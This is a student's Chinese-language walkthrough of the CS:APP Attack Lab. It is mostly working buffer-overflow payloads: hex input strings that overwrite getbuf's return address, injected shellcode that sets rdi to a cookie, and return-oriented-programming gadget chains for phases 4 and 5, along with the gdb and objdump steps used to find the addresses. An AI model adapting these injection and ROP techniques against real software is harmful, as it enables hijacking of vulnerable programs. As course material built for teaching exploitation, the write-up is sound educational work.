

## Attacklab Summary

### 1、phase1

先把汇编代码取出

```shell
objdump -d ./ctarget>>ctarget.s
```

生成的代码很长，查找以下我们需要用到的3个函数，分别是test，getbuf和touch1

```shell
0000000000401968 <test>:
  401968:       48 83 ec 08             sub    $0x8,%rsp
  40196c:       b8 00 00 00 00          mov    $0x0,%eax
  401971:       e8 32 fe ff ff          callq  4017a8 <getbuf>
  401976:       89 c2                   mov    %eax,%edx
  401978:       be 88 31 40 00          mov    $0x403188,%esi
  40197d:       bf 01 00 00 00          mov    $0x1,%edi
  401982:       b8 00 00 00 00          mov    $0x0,%eax
  401987:       e8 64 f4 ff ff          callq  400df0 <__printf_chk@plt>
  40198c:       48 83 c4 08             add    $0x8,%rsp
  401990:       c3                      retq

00000000004017a8 <getbuf>:
  4017a8:       48 83 ec 28             sub    $0x28,%rsp
  4017ac:       48 89 e7                mov    %rsp,%rdi
  4017af:       e8 8c 02 00 00          callq  401a40 <Gets>
  4017b4:       b8 01 00 00 00          mov    $0x1,%eax
  4017b9:       48 83 c4 28             add    $0x28,%rsp
  4017bd:       c3                      retq

00000000004017c0 <touch1>:
  4017c0:       48 83 ec 08             sub    $0x8,%rsp
  4017c4:       c7 05 0e 2d 20 00 01    movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:       00 00 00 
  4017ce:       bf c5 30 40 00          mov    $0x4030c5,%edi
  4017d3:       e8 e8 f4 ff ff          callq  400cc0 <puts@plt>
  4017d8:       bf 01 00 00 00          mov    $0x1,%edi
  4017dd:       e8 ab 04 00 00          callq  401c8d <validate>
  4017e2:       bf 00 00 00 00          mov    $0x0,%edi
  4017e7:       e8 54 f6 ff ff          callq  400e40 <exit@plt>

```

将断点打在4017b9

```shell
b *0x4017b9
```

将运行时输入源设置一下

```shell
set args -qi ans.txt
```

运行后显示一下当前rsp附近的60字节

![](C:\Users\xuliz\Pictures\Screenshots\屏幕截图 2023-06-01 160404.png)

此处即为返回地址，将其设置成touch1的地址即可。

### 2、pashe2

反汇编touch2代码

```shell
   0x00000000004017ec <+0>:	sub    $0x8,%rsp
   0x00000000004017f0 <+4>:	mov    %edi,%edx
   0x00000000004017f2 <+6>:	movl   $0x2,0x202ce0(%rip)        # 0x6044dc <vlevel>
   0x00000000004017fc <+16>:	cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401802 <+22>:	jne    0x401824 <touch2+56>
   0x0000000000401804 <+24>:	mov    $0x4030e8,%esi
   0x0000000000401809 <+29>:	mov    $0x1,%edi
   0x000000000040180e <+34>:	mov    $0x0,%eax
   0x0000000000401813 <+39>:	callq  0x400df0 <__printf_chk@plt>
   0x0000000000401818 <+44>:	mov    $0x2,%edi
   0x000000000040181d <+49>:	callq  0x401c8d <validate>
   0x0000000000401822 <+54>:	jmp    0x401842 <touch2+86>
   0x0000000000401824 <+56>:	mov    $0x403110,%esi
   0x0000000000401829 <+61>:	mov    $0x1,%edi
   0x000000000040182e <+66>:	mov    $0x0,%eax
   0x0000000000401833 <+71>:	callq  0x400df0 <__printf_chk@plt>
   0x0000000000401838 <+76>:	mov    $0x2,%edi
   0x000000000040183d <+81>:	callq  0x401d4f <fail>
   0x0000000000401842 <+86>:	mov    $0x0,%edi
   0x0000000000401847 <+91>:	callq  0x400e40 <exit@plt>

```

得到touch2的首地址为0x4017ec

读懂题意后，我们能知道，题目要求我们再读入字符串后，去执行touch2（和phase1类似），但是同时要求我们把cookie的值设置成touch2的参数，也就是修改rdi的值为cookie.txt中的值（0x59b997fa）；

和phase1一样直接返回肯定不行，所以我们要写一段汇编代码，要求程序修改rdi的值，然后再去执行touch2；

```shell
movq $0x59b997fa,%rdi
pushq $0x4017ec    #将touch2的首地址push到栈上，rsp自动会指向它
retq	#返回后，程序会将pc修改成rsp指定的位置，即跳转到touch2的首地址
```

将上述代码编译后再反汇编，得到下图形式；

```shell
gcc -c icode.s
objdump -d icode.o > icode_dump.txt
```

![image-20230601165618187](C:\Users\xuliz\AppData\Roaming\Typora\typora-user-images\image-20230601165618187.png)

写完这段代码后，我们就只剩一个任务，就是如何让函数getbuf在执行Gets后跳转到此汇编代码处；

这里我们可以想到把这段代码的二进制形式放到栈顶处，并且将getbuf的返回地址设置成栈顶即可；

所以读入的数据可以写成这样；

```shell
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00   #栈顶位置，此值可以通过gdb打断点后显示出来,如下图
```

![image-20230601180938813](C:\Users\xuliz\AppData\Roaming\Typora\typora-user-images\image-20230601180938813.png)

### 3、phase3

读懂题意后，我们发现此题类似于phase2，不过传入的参数为一个指向cookie的ascii表示的指针，而不是cookie；

```shell
cookie:59b997fa
ascii:
                                              141   97    61    a
042   34    22    "                           142   98    62    b
043   35    23    #                           143   99    63    c
044   36    24    $                           144   100   64    d
045   37    25    %                           145   101   65    e
046   38    26    &                           146   102   66    f
047   39    27    '                           147   103   67    g
050   40    28    (                           150   104   68    h
051   41    29    )                           151   105   69    i
052   42    2A    *                           152   106   6A    j
053   43    2B    +                           153   107   6B    k
054   44    2C    ,                           154   108   6C    l
055   45    2D    -                           155   109   6D    m

056   46    2E    .                           156   110   6E    n
057   47    2F    /                           157   111   6F    o
060   48    30    0                           160   112   70    p
061   49    31    1                           161   113   71    q
062   50    32    2                           162   114   72    r
063   51    33    3                           163   115   73    s
064   52    34    4                           164   116   74    t
065   53    35    5                           165   117   75    u
066   54    36    6                           166   118   76    v
067   55    37    7                           167   119   77    w
070   56    38    8                           170   120   78    x
071   57    39    9                           171   121   79    y
072   58    3A    :                           172   122   7A    z

cookie ->:35 39 62 39 39 37 66 61 0
```

touch3的代码反汇编出来，得到首地址为0x4018fa；

```shell
   0x00000000004018fa <+0>:	push   %rbx
   0x00000000004018fb <+1>:	mov    %rdi,%rbx
   0x00000000004018fe <+4>:	movl   $0x3,0x202bd4(%rip)        # 0x6044dc <vlevel>
   0x0000000000401908 <+14>:	mov    %rdi,%rsi
   0x000000000040190b <+17>:	mov    0x202bd3(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401911 <+23>:	callq  0x40184c <hexmatch>
   0x0000000000401916 <+28>:	test   %eax,%eax
   0x0000000000401918 <+30>:	je     0x40193d <touch3+67>
   0x000000000040191a <+32>:	mov    %rbx,%rdx
   0x000000000040191d <+35>:	mov    $0x403138,%esi
   0x0000000000401922 <+40>:	mov    $0x1,%edi
   0x0000000000401927 <+45>:	mov    $0x0,%eax
   0x000000000040192c <+50>:	callq  0x400df0 <__printf_chk@plt>
   0x0000000000401931 <+55>:	mov    $0x3,%edi
   0x0000000000401936 <+60>:	callq  0x401c8d <validate>
   0x000000000040193b <+65>:	jmp    0x40195e <touch3+100>
   0x000000000040193d <+67>:	mov    %rbx,%rdx
   0x0000000000401940 <+70>:	mov    $0x403160,%esi
   0x0000000000401945 <+75>:	mov    $0x1,%edi
   0x000000000040194a <+80>:	mov    $0x0,%eax
   0x000000000040194f <+85>:	callq  0x400df0 <__printf_chk@plt>
   0x0000000000401954 <+90>:	mov    $0x3,%edi
   0x0000000000401959 <+95>:	callq  0x401d4f <fail>
   0x000000000040195e <+100>:	mov    $0x0,%edi
   0x0000000000401963 <+105>:	callq  0x400e40 <exit@plt>

```

需要注入的汇编代码

```shell
movq $05561dca8,%rdi   #因为传入参数形式为char*，所以rdi中应该是一个位置（这个位置中存放cookie的ascii表示形式），为什么是0x5561dca8后面解释。
pushq $0x4018fa    
retq	
```

将此代码编译并反汇编后得到如下

```shell
silly@silly-virtual-machine:~/target1$ cat -n icode2_dump.txt
     1	
     2	icode2.o：     文件格式 elf64-x86-64
     3	
     4	
     5	Disassembly of section .text:
     6	
     7	0000000000000000 <.text>:
     8	   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
     9	   7:	68 fa 18 40 00       	pushq  $0x4018fa
    10	   c:	c3                   	retq   

```

所以类似phase2将输入设置成

```shell
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61  #cookie在此处，位置为0x5561dca8，由栈顶为0x5561dc78推出
00 
```

### 4、phase4

```shell
题目要求使用两条指令完成：
popq rax  ------   58
movq rax,rdi  ------   48 89 c7
```

```shell
start_fram:401994
end_fram:401ab2
在0x401994 - 0x401ab2中间找即可58 和 48 89 c7即可
查找 58:  
	4019b5:       c7 07 54 c2 58 92       movl   $0x9258c254,(%rdi)    ---> 0x4019b9
查找 48 89 c7:   
	4019c3:       c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)   ---> 0x4019c5
```

所以输入的字符串为

```shell
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
b9 19 40 00 00 00 00 00  
fa 97 b9 59 00 00 00 00 
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

### 5、phase5

在farm.c里找到了一个rdi和rsi的加法，本来想写如下汇编代码

```
movq    %rsp,%rdi
popq	%rax
0x30
movq	%rax,%rsi
lea (%rdi,%rsi,1),%rax	
movq %rax,%rdi		
touch3
0x25396239396661
```

结果一查第一个指令的代码就没有，应该是要找另外的寄存器调来调去，太晚了不想找了，直接抄了别人的。

```shell
movq %rsp,%rax		
movq %rax,%rdi		
popq %rax			
0x48				
movl %eax,%edx		
movl %edx,%ecx		
movl %ecx,%esi		
lea (%rdi,%rsi,1),%rax	
movq %rax,%rdi		
touch3
0x25396239396661
```

```shell
90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 
06 1A 40 00 00 00 00 00 
C5 19 40 00 00 00 00 00 
AB 19 40 00 00 00 00 00 
48 00 00 00 00 00 00 00 
DD 19 40 00 00 00 00 00 
34 1A 40 00 00 00 00 00 
27 1A 40 00 00 00 00 00 
D6 19 40 00 00 00 00 00
C5 19 40 00 00 00 00 00 
FA 18 40 00 00 00 00 00 
35 39 62 39 39 37 66 61
```

